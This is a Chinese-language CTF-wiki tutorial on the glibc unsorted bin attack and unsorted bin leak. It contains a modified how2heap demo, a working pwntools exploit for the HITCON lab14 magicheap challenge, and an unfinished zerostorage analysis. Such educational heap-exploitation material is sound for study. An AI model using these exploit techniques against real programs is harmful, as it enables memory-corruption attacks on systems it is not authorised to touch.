# Unsorted Bin Attack

## 概述

Unsorted Bin Attack，顧名思義，該攻擊與 Glibc 堆管理中的的 Unsorted Bin 的機制緊密相關。

Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指針。

Unsorted Bin Attack 可以達到的效果是實現修改任意地址值爲一個較大的數值。

## Unsorted Bin 回顧

在介紹 Unsorted Bin 攻擊前，可以先回顧一下 Unsorted Bin 的基本來源以及基本使用情況。

### 基本來源

1. 當一個較大的 chunk 被分割成兩半後，如果剩下的部分大於 MINSIZE，就會被放到 unsorted bin 中。
2. 釋放一個不屬於 fast bin 的 chunk，並且該 chunk 不和 top chunk 緊鄰時，該 chunk 會被首先放到 unsorted bin 中。關於top chunk的解釋，請參考下面的介紹。
3. 當進行 malloc_consolidate 時，可能會把合併後的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近鄰的話。

### 基本使用情況

1. Unsorted Bin 在使用的過程中，採用的遍歷順序是 FIFO，**即插入的時候插入到 unsorted bin 的頭部，取出的時候從鏈表尾獲取**。
2. 在程序 malloc 時，如果在 fastbin，small bin 中找不到對應大小的 chunk，就會嘗試從 Unsorted Bin 中尋找 chunk。如果取出來的 chunk 大小剛好滿足，就會直接返回給用戶，否則就會把這些 chunk 分別插入到對應的 bin 中。

## Unsorted Bin Leak

在介紹 Unsorted Bin Attack 之前，我們先介紹一下如何使用 Unsorted Bin 進行 Leak。這其實是一個小 trick，許多題中都會用到。

### Unsorted Bin 的結構

`Unsorted Bin` 在管理時爲循環雙向鏈表，若 `Unsorted Bin` 中有兩個 `bin`，那麼該鏈表結構如下

![](./figure/unsortedbins-struct.jpg)

下面這張圖就是上面的結構的復現

![](./figure/gdb-debug-state.png)

我們可以看到，在該鏈表中必有一個節點（不準確的說，是尾節點，這個就意會一下把，畢竟循環鏈表實際上沒有頭尾）的 `fd` 指針會指向 `main_arena` 結構體內部。

### Leak 原理

如果我們可以把正確的 `fd` 指針 leak 出來，就可以獲得一個與 `main_arena` 有固定偏移的地址，這個偏移可以通過調試得出。而`main_arena` 是一個 `struct malloc_state` 類型的全局變量，是 `ptmalloc` 管理主分配區的唯一實例。說到全局變量，立馬可以想到他會被分配在 `.data` 或者 `.bss` 等段上，那麼如果我們有進程所使用的 `libc` 的 `.so` 文件的話，我們就可以獲得 `main_arena` 與 `libc` 基地址的偏移，實現對 `ASLR` 的繞過。

那麼如何取得 `main_arena` 與 `libc` 基址的偏移呢？這裏提供兩種思路。

#### 通過 __malloc_trim 函數得出

在 `malloc.c` 中有這樣一段代碼

```cpp
int
__malloc_trim (size_t s)
{
  int result = 0;

  if (__malloc_initialized < 0)
    ptmalloc_init ();

  mstate ar_ptr = &main_arena;//<=here!
  do
    {
      __libc_lock_lock (ar_ptr->mutex);
      result |= mtrim (ar_ptr, s);
      __libc_lock_unlock (ar_ptr->mutex);

      ar_ptr = ar_ptr->next;
    }
  while (ar_ptr != &main_arena);

  return result;
}
```

注意到 `mstate ar_ptr = &main_arena;` 這裏對 `main_arena` 進行了訪問，所以我們就可以通過 IDA 等工具分析出偏移了。

![](./figure/malloc-trim-ida.png)

比如把 `.so` 文件放到 IDA 中，找到 `malloc_trim` 函數，就可以獲得偏移了。

#### 通過 __malloc_hook 直接算出

比較巧合的是，`main_arena` 和 `__malloc_hook` 的地址差是 0x10，而大多數的 libc 都可以直接查出 `__malloc_hook` 的地址，這樣可以大幅減小工作量。以 pwntools 爲例

```python
main_arena_offset = ELF("libc.so.6").symbols["__malloc_hook"] + 0x10
```

這樣就可以獲得 `main_arena` 與基地址的偏移了。

### 實現 Leak 的方法

一般來說，要實現 leak，需要有 `UAF`，將一個 `chunk` 放入 `Unsorted Bin` 中後再打出其 `fd`。一般的筆記管理題都會有 `show` 的功能，對處於鏈表尾的節點 `show` 就可以獲得 `libc` 的基地址了。

特別的，`CTF` 中的利用，堆往往是剛剛初始化的，所以 `Unsorted Bin` 一般都是乾淨的，當裏面只存在一個 `bin` 的時候，該 `bin` 的 `fd` 和 `bk` 都會指向 `main_arena` 中。

另外，如果我們無法做到訪問鏈表尾，但是可以訪問鏈表頭，那麼在 32 位的環境下，對鏈表頭進行 `printf` 等往往可以把 `fd` 和 `bk` 一起輸出出來，這個時候同樣可以實現有效的 leak。然而在 64 位下，由於高地址往往爲 `\x00`，很多輸出函數會被截斷，這個時候可能就難以實現有效 leak。

## Unsorted Bin Attack 原理

在  [glibc](https://code.woboq.org/userspace/glibc/)/[malloc](https://code.woboq.org/userspace/glibc/malloc/)/[malloc.c](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html) 中的 `_int_malloc ` 有這麼一段代碼，當將一個 unsorted bin取出的時候，會將 `bck->fd` 的位置寫入本 Unsorted Bin 的位置。

```C
          /* remove from unsorted list */
          if (__glibc_unlikely (bck->fd != victim))
            malloc_printerr ("malloc(): corrupted unsorted chunks 3");
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
```

換而言之，如果我們控制了 bk 的值，我們就能將 `unsorted_chunks (av)` 寫到任意地址。



這裏我以 shellphish 的 how2heap 倉庫中的 [unsorted_bin_attack.c](https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c) 爲例進行介紹，這裏我做一些簡單的修改，如下

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
  fprintf(stderr, "This file demonstrates unsorted bin attack by write a large "
                  "unsigned long value into stack\n");
  fprintf(
      stderr,
      "In practice, unsorted bin attack is generally prepared for further "
      "attacks, such as rewriting the "
      "global variable global_max_fast in libc for further fastbin attack\n\n");

  unsigned long target_var = 0;
  fprintf(stderr,
          "Let's first look at the target we want to rewrite on stack:\n");
  fprintf(stderr, "%p: %ld\n\n", &target_var, target_var);

  unsigned long *p = malloc(400);
  fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",
          p);
  fprintf(stderr, "And allocate another normal chunk in order to avoid "
                  "consolidating the top chunk with"
                  "the first one during the free()\n\n");
  malloc(500);

  free(p);
  fprintf(stderr, "We free the first chunk now and it will be inserted in the "
                  "unsorted bin with its bk pointer "
                  "point to %p\n",
          (void *)p[1]);

  /*------------VULNERABILITY-----------*/

  p[1] = (unsigned long)(&target_var - 2);
  fprintf(stderr, "Now emulating a vulnerability that can overwrite the "
                  "victim->bk pointer\n");
  fprintf(stderr, "And we write it with the target address-16 (in 32-bits "
                  "machine, it should be target address-8):%p\n\n",
          (void *)p[1]);

  //------------------------------------

  malloc(400);
  fprintf(stderr, "Let's malloc again to get the chunk we just free. During "
                  "this time, target should has already been "
                  "rewrite:\n");
  fprintf(stderr, "%p: %p\n", &target_var, (void *)target_var);
}
```

程序執行後的效果爲

```shell
➜  unsorted_bin_attack git:(master) ✗ gcc unsorted_bin_attack.c -o unsorted_bin_attack
➜  unsorted_bin_attack git:(master) ✗ ./unsorted_bin_attack
This file demonstrates unsorted bin attack by write a large unsigned long value into stack
In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the target we want to rewrite on stack:
0x7ffe0d232518: 0

Now, we allocate first normal chunk on the heap at: 0x1fce010
And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508

Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:
0x7ffe0d232518: 0x7f1c705ffb78
```

這裏我們可以使用一個圖來描述一下具體發生的流程以及背後的原理。

![](./figure/unsorted_bin_attack_order.png)

**初始狀態時**

unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。

**執行free(p)**

由於釋放的 chunk 大小不屬於 fast bin 範圍內，所以會首先放入到 unsorted bin 中。

**修改p[1]**

經過修改之後，原來在 unsorted bin 中的 p 的 bk 指針就會指向 target addr-16 處僞造的 chunk，即 Target Value 處於僞造 chunk 的 fd 處。

**申請400大小的chunk**

此時，所申請的 chunk 處於 small bin 所在的範圍，其對應的 bin 中暫時沒有 chunk，所以會去unsorted bin中找，發現 unsorted bin 不空，於是把 unsorted bin 中的最後一個 chunk 拿出來。

```c
        while ((victim = unsorted_chunks(av)->bk) != unsorted_chunks(av)) {
            bck = victim->bk;
            if (__builtin_expect(chunksize_nomask(victim) <= 2 * SIZE_SZ, 0) ||
                __builtin_expect(chunksize_nomask(victim) > av->system_mem, 0))
                malloc_printerr(check_action, "malloc(): memory corruption",
                                chunk2mem(victim), av);
            size = chunksize(victim);

            /*
               If a small request, try to use last remainder if it is the
               only chunk in unsorted bin.  This helps promote locality for
               runs of consecutive small requests. This is the only
               exception to best-fit, and applies only when there is
               no exact fit for a small chunk.
             */
			/* 顯然，bck被修改，並不符合這裏的要求*/
            if (in_smallbin_range(nb) && bck == unsorted_chunks(av) &&
                victim == av->last_remainder &&
                (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) {
				....
            }

            /* remove from unsorted list */
            unsorted_chunks(av)->bk = bck;
            bck->fd                 = unsorted_chunks(av);
```

- victim = unsorted_chunks(av)->bk=p
- bck = victim->bk=p->bk = target addr-16
- unsorted_chunks(av)->bk = bck=target addr-16
- bck->fd                 = *(target addr -16+16) = unsorted_chunks(av);

**可以看出，在將 unsorted bin 的最後一個 chunk 拿出來的過程中，victim 的 fd 並沒有發揮作用，所以即使我們修改了其爲一個不合法的值也沒有關係。**然而，需要注意的是，unsorted bin 鏈表可能就此破壞，在插入 chunk 時，可能會出現問題。

即修改 target 處的值爲 unsorted bin 的鏈表頭部 0x7f1c705ffb78，也就是之前輸出的信息。

```shell
We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508

Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:
0x7ffe0d232518: 0x7f1c705ffb78
```

這裏我們可以看到 unsorted bin attack 確實可以修改任意地址的值，但是所修改成的值卻不受我們控制，唯一可以知道的是，這個值比較大。**而且，需要注意的是，**

這看起來似乎並沒有什麼用處，但是其實還是有點卵用的，比如說

- 我們通過修改循環的次數來使得程序可以執行多次循環。
- 我們可以修改 heap 中的 global_max_fast 來使得更大的 chunk 可以被視爲 fast bin，這樣我們就可以去執行一些 fast bin attack了。

## HITCON Training lab14 magic heap

[題目鏈接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unsorted_bin_attack/hitcontraining_lab14)

這裏我們修改一下源程序中的 l33t 函數，以便於可以正常運行。

```c
void l33t() { system("cat ./flag"); }
```

### 基本信息

```shell
➜  hitcontraining_lab14 git:(master) file magicheap
magicheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped
➜  hitcontraining_lab14 git:(master) checksec magicheap
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出，該程序是一個動態鏈接的64程序，主要開啓了 NX 保護與 Canary 保護。

### 基本功能

程序大概就是自己寫的堆管理器，主要有以下功能

1. 創建堆。根據用戶指定大小申請相應堆，並且讀入指定長度的內容，但是並沒有設置 NULL。
2. 編輯堆。根據指定的索引判斷對應堆是不是非空，如果非空，就根據用戶讀入的大小，來修改堆的內容，這裏其實就出現了任意長度堆溢出的漏洞。
3. 刪除堆。根據指定的索引判斷對應堆是不是非空，如果非空，就將對應堆釋放並置爲 NULL。

同時，我們看到，當我們控制 v3 爲 4869，同時控制 magic 大於 4869，就可以得到 flag 了。

### 利用

很顯然， 我們直接利用 unsorted bin attack 即可。

1. 釋放一個堆塊到 unsorted bin 中。
2. 利用堆溢出漏洞修改 unsorted bin 中對應堆塊的 bk 指針爲 &magic-16。
3. 觸發漏洞即可。

代碼如下

```Python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./magicheap')


def create_heap(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit_heap(idx, size, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def del_heap(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


create_heap(0x20, "dada")  # 0
create_heap(0x80, "dada")  # 1
# in order not to merge into top chunk
create_heap(0x20, "dada")  # 2

del_heap(1)

magic = 0x6020c0
fd = 0
bk = magic - 0x10

edit_heap(0, 0x20 + 0x20, "a" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))
create_heap(0x80, "dada")  #trigger unsorted bin attack
r.recvuntil(":")
r.sendline("4869")
r.interactive()

```

## 2016 0CTF zerostorage-待完成

**注：待進一步完成。**

這裏我們以 2016 年 0CTF 的 [zerostorage](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage) 爲例，進行介紹。

**這個題當時給了服務器的系統版本和內核版本，所以自己可以下一個一模一樣的進行調試，這裏我們就直接用自己的本地機器調試了。但是在目前的Ubuntu 16.04 中，由於進一步的隨機化，導致 libc 加載的位置與程序模塊加載的位置之間的相對偏移不再固定，所以 BrieflyX 的策略就無法再次使用，似乎只能用 angelboy 的策略了。**

### 安全性檢查

可以看出，該程序開啓了所有的保護

```shell
pwndbg> checksec
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

### 基本功能分析

程序管理在 bss 段的存儲空間 storage ，具有插入，刪除，合併，刪除，查看，枚舉，退出功能。這個storage的結構體如下

```text
00000000 Storage         struc ; (sizeof=0x18, mappedto_7)
00000000                                         ; XREF: .bss:storage_list/r
00000000 use             dq ?
00000008 size            dq ?
00000010 xor_addr        dq ?
00000018 Storage         ends
```

#### insert-1

基本功能如下

1.  逐一查看 storage 數組，查找第一個未使用的元素，但是這個數組最大也就是32。
2.  讀取storage 元素所需要存儲內容的長度。
    -   如果長度不大於0，直接退出；
    -   否則如果申請的字節數小於128，那就設置爲128；
    -   否則，如果申請的字節數不大於4096，那就設置爲對應的數值；
    -   否則，設置爲4096。
3.  使用 calloc 分配指定長度，注意 calloc 會初始化 chunk 爲0。
4.  將 calloc 分配的內存地址與 bss 段的一個內存（初始時刻爲一個隨機數）進行抑或，得到一個新的內存地址。
5.  根據讀取的storage的大小來讀入內容。
6.  將對應的storage的大小以及存儲內容的地址保存到對應的storage 元素中，並標記該元素處於可用狀態。**但是，需要注意的是，這裏記錄的storage的大小是自己輸入的大小！！！**
7.  遞增 storage num的數量。

#### update-2

1.  如果沒有任何存儲，就直接返回。
2.  讀入要更新的storage元素的id，如果id大於31或者目前處於不處於使用狀態，說明不對，直接返回。
3.  讀取**更新後**storage 元素所需要存儲內容的長度。
    -   如果長度不大於0，直接退出；
    -   否則如果申請的字節數小於128，那就設置爲128；
    -   否則，如果申請的字節數不大於4096，那就設置爲對應的數值；
    -   否則，設置爲4096。
4.  根據 bss 段對應的隨機數獲取原先storage 存儲內容的地址，
5.  如果更新後所需的長度不等於更新前的長度，就使用realloc爲其重新分配內存。
6.  再次讀取數據，同時更新storage 元素。

#### merge-3

1. 如果正在使用的元素不大於1個，那麼無法合併，直接退出即可。
2. 判斷storage是否已經滿了，如果不滿，找出空閒的那一塊。
3. 分別讀取merge_from的id以及merge_to的id號，並進行相應大小以及使用狀態的檢測。
4. 根據最初用戶輸入的大小來計算兩個 merge 到一起後所需要的空間，**如果不大於128，那就不會申請新的空間**，否則就申請相應大小的新的空間。
5. 依次將merge_to與merge_from的內容拷貝到相對應的位置。
6. **最後存儲merge_from內容的內存地址被釋放了，但並沒有被置爲NULL。同時，存放merge_to內容的內存地址並沒有被釋放，相應的storage的抑或後的地址只是被置爲了NULL。**

**但是需要注意的是，，在merge的時候，並沒有檢測兩個storage的ID是否相同。**

#### delete-4

1. 如果沒有存儲任何元素，那就直接返回。
2. 讀取指定要修改的storage的元素的id，如果 id 大於32，就直接返回。
3. 如果 storage  的對應元素並不在使用狀態，那麼也同時返回。
4. 之後就是將元素對應的字段分別設置爲NULL，並且釋放對應的內存。

#### view-5

1. 如果沒有存儲任何元素，那就直接返回。
2. 讀取指定要修改的storage的元素的id，如果 id 大於32，就直接返回。
3. 如果 storage  的對應元素並不在使用狀態，那麼也同時返回。
4. 輸入對應的storage 的內容。

#### list-6

1. 如果沒有存儲任何元素，那就直接返回。
2. 讀取指定要修改的storage的元素的id，如果 id 大於32，就直接返回。
3. 遍歷所有正在使用的storage，輸入其對應的下標以及對應storage的大小。

### 漏洞確定

通過這麼簡單的分析，我們可以 基本確定漏洞主要就是集中在insert操作與merge操作中，尤其是當我們merge兩個較小size的storage時，會出現一些問題。

我們來具體分析一下，如果我們在insert過程中插入較小的size（比如8）的storage  A，那麼，當我們進行merge時，假設我們選擇merge的兩個storage 都爲A，那麼此時程序會直接把就會直接把A的內容再添加到A的原有內容的後面，然後接着就會把A對應的存儲數據部分的內存free掉，但是這並沒有什麼作用，因爲A存儲內容的地址被賦給了另外一個storage，當再訪問merge 後的 storage B部分的內容時，由於B的存儲數據部分的地址其實就是A對應的存儲數據的地址，所以打印的就是A的數據部分的內容。但是，我們之前剛剛把A對應的內存釋放掉，而A由於不在fast bin範圍內，所以只會被放到unsorted bin中（而且此時只有一個），所以此時A的fd和bk都存放的是unsorted bin的一個基地址。

如果我們在merge之前曾經刪除過一個storage C，那麼在我們merge A後，A就會插在unsorted bin的雙向鏈表的首部，所以其fd則是C對應的地址，bk則是unsorted bin的一個基地址。這樣我們就可以直接泄露兩個地址。

而且需要注意的是，我們還是可以去修改merge後的B的內容的，所以這其實就是個Use After Free。

### 利用流程

- Unsorted Bin Attack

  利用 unsorted bin attack ，修改 global_max_fast 全局變量，由於 global_max_fast 變量爲控制最大的Fast chunk的大小，將這裏改寫爲unsorted bin的地址(一般來說是一個很大的正數)，就能使之後的chunk都被當作fast chunk，即可進行Fast bin attack。

- Fast Bin Attack

  

## 題目

## 參考文獻

- http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/
- https://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage
- https://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py
